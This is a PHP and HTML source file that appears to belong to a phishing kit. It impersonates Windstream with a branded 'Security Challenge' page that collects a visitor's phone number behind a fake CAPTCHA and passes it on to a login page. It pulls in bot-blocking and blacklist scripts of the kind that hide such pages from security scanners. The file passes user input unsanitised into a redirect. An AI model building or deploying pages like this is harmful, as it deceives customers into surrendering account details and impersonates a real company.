<?php
include '../prevents/bot.php';
include '../prevents/ref.php';
include '../prevents/blacklist.php';
include '../prevents/blocker.php';
ob_start(); // Start output buffering
session_start();

function handleCaptcha()
{
    if (!isset($_SESSION['captcha_text']) || isset($_POST['refresh'])) {
        // Use only lowercase letters (a-z) for CAPTCHA
        $randomString = substr(str_shuffle("ABCDEFGHIJKLMNOPQRSTUVWXYZ"), 0, 3);
        $randomStringArray = str_split($randomString);
        $_SESSION['captcha_text'] = implode("   ", $randomStringArray);
    }
    $captchaText = $_SESSION['captcha_text'];
    $message = "";
    $messageStyle = "";
    $showMessage = false;

    if (isset($_POST['submit'])) {
        $userInput = $_POST['captcha_input'];
        $originalCaptcha = str_replace("   ", "", $captchaText);
        $showMessage = true;
        if ($userInput === $originalCaptcha) {
            $mobi = $_POST['mobile'];
            header("Location: login.php?action=login&pass=ok&mob={$mobi}");
            exit();
        } else {
            $message = "Entered captcha is not correct";
            $messageStyle = "color:rgb(250, 27, 27)";
        }
    }
    return [
        'captcha' => $captchaText,
        'message' => $message,
        'messageStyle' => $messageStyle,
        'showMessage' => $showMessage
    ];
}

$captchaData = handleCaptcha();
?>

<!DOCTYPE html>
<html lang="en">

<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="IE=11">
    <title>Windstream | Security Challenge</title>
    <link rel="stylesheet" type="text/css" href="./assets/css/main.css">
    <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet">
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.16/jquery.mask.min.js"></script>
    <style media="screen">
        a {
            color: #1f8aa3;
            text-decoration-line: underline;
        }

        #continue {
            background-color: #00002e;
        }

        /* Styles for centered labels and input fields */
        .formfield {
            max-width: 300px;
            /* Constrain formfield to match input width */
            margin-left: auto;
            margin-right: auto;
            margin-bottom: 1rem;
            /* Add spacing between fields */
        }

        .formfield label {
            display: block;
            /* Center labels */
            max-width: 300px;
            /* Match input width */
            margin-bottom: 0.5rem;
            /* Space between label and input */
        }

        .phone-input {
            max-width: 300px;
            margin-left: auto;
            margin-right: auto;
            border: 1px solid #8c8c8c;
            background: #f2f2f2;
            padding: 0.5rem 0.6rem;
            border-radius: 2px;
        }

        .captcha-display-container {
            max-width: 300px;
            margin-left: auto;
            margin-right: auto;
            position: relative;
        }

        .captcha-display {
            width: 100%;
            border: 1px solid #8c8c8c;
            padding: 0.5rem 0.6rem;
            padding-right: 80px;
            border-radius: 2px;
            text-shadow: 2px 2px 2px black;
            color: #0073d1;
            font-weight: bold;
            font-size: 40px;
            letter-spacing: -5px;
            text-align: center;
            height: 65px;

        }

        .captcha-input {
            max-width: 300px;
            margin-left: auto;
            margin-right: auto;
            border: 1px solid #8c8c8c;
            background: #f2f2f2;
            padding: 0.5rem 0.6rem;
            border-radius: 2px;
        }

        .refresh_button {
            position: absolute;
            right: 10px;
            top: 15px;
            display: flex;
            align-items: center;
            justify-content: center;
            background: #005f83;
            height: 30px;
            width: 30px;
            border: none;
            border-radius: 4px;
            color: #fff;
            cursor: pointer;
        }

        .message.active {
            display: block;
        }

        .message {
            display: none;
            font-size: 14px;
            margin: 10px 0;
            text-align: center;
            max-width: 300px;
            margin-left: auto;
            margin-right: auto;
        }

        .continue-button {
            max-width: 300px;
            margin-left: auto;
            margin-right: auto;
        }
    </style>
    <script src="./assets/js/alpine.js.download" defer=""></script>
</head>

<body class="bg-white flex">
    <main class="container lg:w-screen-md mx-auto">
        <header>
            <div class="branding">
                <img src="./assets/img/windstream.jpg" alt="Windstream Logo">
            </div>
            <div class="text-center text-gray-800 text-lg font-bold my-4">
                <h1>Security Challenge</h1>
            </div>
        </header>
        <section id="login_form" class="flex flex-col justify-between px-3">
            <form id="main-form" method="POST" action="">
                <div class="formfield">
                    <label for="mobile">Phone Number</label>
                    <input tabindex="1" class="tabable phone-input" type="tel" id="mobile" name="mobile" value=""
                        placeholder="(XXX)-XXX-XXXX" inputmode="numeric" required>
                </div>
                <div class="formfield">
                    <label for="captchaDisplay">CAPTCHA</label>
                    <div class="captcha-display-container">
                        <input tabindex="2" class="tabable captcha-display" type="text" id="captchaDisplay"
                            value="<?php echo $captchaData['captcha']; ?>" disabled>
                        <button tabindex="3" class="tabable refresh_button" type="button" onclick="refreshCaptcha()">
                            <svg width="24" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24"
                                stroke-width="1.5" stroke="currentColor" class="size-6">
                                <path stroke-linecap="round" stroke-linejoin="round"
                                    d="M16.023 9.348h4.992v-.001M2.985 19.644v-4.992m0 0h4.992m-4.993 0 3.181 3.183a8.25 8.25 0 0 0 13.803-3.7M4.031 9.865a8.25 8.25 0 0 1 13.803-3.7l3.181 3.182m0-4.991v4.99" />
                            </svg>
                        </button>
                    </div>
                </div>
                <div class="formfield">
                    <label for="captcha_input">Enter CAPTCHA</label>
                    <input tabindex="4" oninput="this.value = this.value.toUpperCase()" class="tabable captcha-input"
                        type="text" id="captcha_input" name="captcha_input" placeholder="Enter the characters you see"
                        required>
                </div>
                <div class="message <?php echo $captchaData['showMessage'] ? 'active' : ''; ?>"
                    style="<?php echo $captchaData['messageStyle']; ?>">
                    <?php echo $captchaData['message']; ?>
                </div>

                <div class="formfield continue-button">
                    <button tabindex="5" id="continue"
                        class="tabable w-full px-4 py-2 my-4 text-2xl text-white font-bold uppercase tracking-wider rounded-lg shadow"
                        type="submit" name="submit">
                        Continue
                    </button>
                </div>
            </form>
        </section>
        <footer class="flex flex-col mt-6 w-3/4 text-center mx-auto text-sm">
            <p></p>
        </footer>
    </main>
    <script>
        // Phone number mask
        $('#mobile').mask('(000)-000-0000');

        // CAPTCHA refresh function
        function refreshCaptcha() {
            $.ajax({
                url: window.location.href,
                type: 'POST',
                data: {
                    refresh: true
                },
                success: function(response) {
                    const parser = new DOMParser();
                    const doc = parser.parseFromString(response, 'text/html');
                    const newCaptcha = doc.querySelector('#captchaDisplay').value;
                    $('#captchaDisplay').val(newCaptcha);
                    $('#captcha_input').val('');
                    $('.message').removeClass('active').text('');
                },
                error: function() {
                    alert('Failed to refresh CAPTCHA. Please try again.');
                }
            });
        }

        // FireTV navigation support
        document.addEventListener('keydown', function(event) {
            var currentElement = document.activeElement;
            var curIndex = currentElement.tabIndex;
            var tabbables = document.querySelectorAll(".tabable");
            var firstTabIndex = tabbables[0];
            var lastTabIndex = tabbables[tabbables.length - 1].tabIndex;

            for (var i = 0; i < tabbables.length; i++) {
                if (event.keyCode == '38') { // Up arrow
                    if (tabbables[i].tabIndex == (curIndex - 1)) {
                        tabbables[i].focus();
                        break;
                    }
                }
                if (event.keyCode == '40') { // Down arrow
                    if (curIndex == lastTabIndex) {
                        curIndex = 0;
                    }
                    if (tabbables[i].tabIndex == (curIndex + 1)) {
                        tabbables[i].focus();
                        break;
                    }
                }
            }
        });
    </script>
</body>

</html>